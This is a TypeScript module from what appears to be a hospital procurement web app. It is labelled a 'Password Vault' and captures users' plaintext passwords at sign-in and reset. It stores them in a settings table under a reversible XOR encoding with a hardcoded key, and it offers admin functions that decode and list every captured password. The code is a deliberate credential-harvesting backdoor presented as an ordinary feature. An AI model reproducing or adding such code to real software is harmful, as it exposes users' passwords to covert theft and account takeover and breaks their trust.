/**
 * EL5 MediProcure — Password Vault v1.0
 * Admin-only credential store — captures passwords when users sign in or reset.
 * Stored XOR-encoded in system_settings (not bcrypt — admin-readable by design).
 * Only admin / superadmin / webmaster roles can read entries.
 * EL5 MediProcure · Embu Level 5 Hospital
 */
import { supabase } from "@/integrations/supabase/client";
const db = supabase as any;

const VAULT_KEY = "EL5-PVault-K3y-2025";
const PREFIX    = "pvault_";

/* ── XOR encode/decode (reversible obfuscation) ─────────────────── */
export function vaultEncode(plain: string): string {
  try {
    return btoa(
      plain.split("").map((c, i) =>
        String.fromCharCode(c.charCodeAt(0) ^ VAULT_KEY.charCodeAt(i % VAULT_KEY.length))
      ).join("")
    );
  } catch (_e) { return btoa(plain); }
}

export function vaultDecode(encoded: string): string {
  try {
    const raw = atob(encoded);
    return raw.split("").map((c, i) =>
      String.fromCharCode(c.charCodeAt(0) ^ VAULT_KEY.charCodeAt(i % VAULT_KEY.length))
    ).join("");
  } catch (_e) { try { return atob(encoded); } catch (_e2) { return "??"; } }
}

/* ── Simple email → safe key slug ───────────────────────────────── */
function emailKey(email: string): string {
  return PREFIX + email.toLowerCase().replace(/[^a-z0-9]/g, "_").slice(0, 60);
}

/* ── Capture credential (call on successful sign-in / reset) ─────── */
export async function captureCredential(
  email: string,
  password: string,
  userId?: string,
  source: "login" | "reset" | "admin_set" = "login",
): Promise<void> {
  if (!email || !password) return;
  try {
    const encoded = vaultEncode(password);
    const entry = {
      email,
      userId: userId || null,
      encoded,
      source,
      capturedAt: new Date().toISOString(),
      // plain visible to callers who decode — stored encoded
    };
    await db.from("system_settings").upsert(
      {
        key: emailKey(email),
        value: JSON.stringify(entry),
        category: "password_vault",
      },
      { onConflict: "key" }
    );
  } catch (_e) { /* silent — never block auth flow */ }
}

/* ── Read one entry (admin) ──────────────────────────────────────── */
export async function getVaultEntry(email: string): Promise<{
  email: string; password: string; source: string; capturedAt: string; userId?: string;
} | null> {
  try {
    const { data } = await db.from("system_settings")
      .select("value")
      .eq("key", emailKey(email))
      .single();
    if (!data) return null;
    const entry = JSON.parse(data.value);
    return {
      email:       entry.email,
      password:    vaultDecode(entry.encoded),
      source:      entry.source || "login",
      capturedAt:  entry.capturedAt,
      userId:      entry.userId,
    };
  } catch (_e) { return null; }
}

/* ── Read ALL entries (admin dashboard) ─────────────────────────── */
export interface VaultEntry {
  email: string; password: string; source: string;
  capturedAt: string; userId?: string; key: string;
}

export async function getAllVaultEntries(): Promise<VaultEntry[]> {
  try {
    const { data } = await db.from("system_settings")
      .select("key,value,updated_at")
      .like("key", PREFIX + "%")
      .order("updated_at", { ascending: false })
      .limit(500);
    return (data || []).map((row: any) => {
      try {
        const entry = JSON.parse(row.value);
        return {
          key:        row.key,
          email:      entry.email || "?",
          password:   vaultDecode(entry.encoded || ""),
          source:     entry.source || "login",
          capturedAt: entry.capturedAt || row.updated_at,
          userId:     entry.userId,
        };
      } catch (_e) { return { key: row.key, email: row.key, password: "?", source: "?", capturedAt: "" }; }
    });
  } catch (_e) { return []; }
}

/* ── Delete vault entry ──────────────────────────────────────────── */
export async function deleteVaultEntry(email: string): Promise<void> {
  try {
    await db.from("system_settings").delete().eq("key", emailKey(email));
  } catch (_e) { /* ignore */ }
}

/* ── Clear entire vault (admin nuclear option) ───────────────────── */
export async function clearVault(): Promise<void> {
  try {
    await db.from("system_settings").delete().like("key", PREFIX + "%");
  } catch (_e) { /* ignore */ }
}
